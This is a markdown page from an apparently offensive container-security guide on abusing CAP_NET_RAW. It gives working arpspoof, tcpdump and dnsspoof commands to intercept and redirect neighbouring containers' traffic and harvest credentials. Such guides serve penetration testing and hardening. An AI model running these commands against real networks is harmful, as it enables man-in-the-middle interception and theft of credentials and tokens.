---
title: "CAP_NET_RAW: sniffing and spoofing from inside the container network"
order: 7
description: "CAP_NET_RAW allows creation of raw and packet sockets. It is in the Docker default set, so it is widely available: an attacker uses it to sniff traffic on the container's network, forge ARP and DNS responses to redirect neighbours, and craft arbitrary packets, enabling man-in-the-middle and lateral movement across the container or pod network even without a host escape."
keywords:
  - cap_net_raw
  - raw socket
  - arp spoofing
  - dns spoofing
  - container network
---

# CAP_NET_RAW

`CAP_NET_RAW` permits `AF_PACKET` and raw `AF_INET` sockets, which read and write link- and network-layer frames directly. Unlike the other capabilities on these pages it does not escape to the host kernel; instead it compromises the container network. Because it is part of the Docker default capability set, almost every container has it, which makes network interception a reliable first move for pivoting between containers on a shared bridge or pods on a shared node.

Confirm the capability and inspect the local segment:

```bash
capsh --print | grep -o cap_net_raw
grep CapEff /proc/self/status          # bit 13 set
ip -4 neigh; ip -4 addr               # neighbours and local subnet
```

## Route: ARP spoofing for man-in-the-middle

On a shared layer-2 bridge (the default Docker `bridge` network, or pods on one node) the attacker forges ARP replies to bind a victim's gateway IP to the attacker's MAC, so victim traffic flows through the attacker's container.

```bash
# enable forwarding so the victim keeps connectivity while you intercept
sysctl -w net.ipv4.ip_forward=1 2>/dev/null
# poison the victim's view of the gateway, and the gateway's view of the victim
arpspoof -i eth0 -t 172.17.0.3 172.17.0.1 &
arpspoof -i eth0 -t 172.17.0.1 172.17.0.3 &
tcpdump -i eth0 -w loot.pcap host 172.17.0.3   # capture the redirected traffic
```

## Route: DNS spoofing and packet crafting

Raw sockets let the attacker answer DNS queries from neighbours before the real resolver does, pointing a service name at an attacker-controlled address to harvest credentials from cleartext or TLS-downgraded protocols. The same primitive forges packets to probe or exploit services that trust source addresses on the internal network.

```bash
dnsspoof -i eth0 -f hosts.txt       # answer selected names with attacker IPs
```

## Exploitation notes

- This is lateral movement within the container or pod network, not a host escape. Its value is harvesting credentials and tokens in transit (internal HTTP, database, or metadata traffic) that then unlock other hosts.
- Container networks are frequently flat, so one compromised default container can intercept traffic for every sibling on the same bridge; in Kubernetes without a network policy, pods on a node share reachability.
- Dropping this capability (`--cap-drop=NET_RAW`) is a common hardening step, so its presence is not guaranteed on locked-down workloads; confirm before relying on it.

## Tools

- [dsniff (arpspoof, dnsspoof)](https://www.monkey.org/~dugsong/dsniff/)
- [Scapy (raw packet crafting)](https://scapy.net/)

## References

- [man 7 raw](https://man7.org/linux/man-pages/man7/raw.7.html)
- [man 7 packet](https://man7.org/linux/man-pages/man7/packet.7.html)
- [HackTricks: CAP_NET_RAW](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_net_raw)
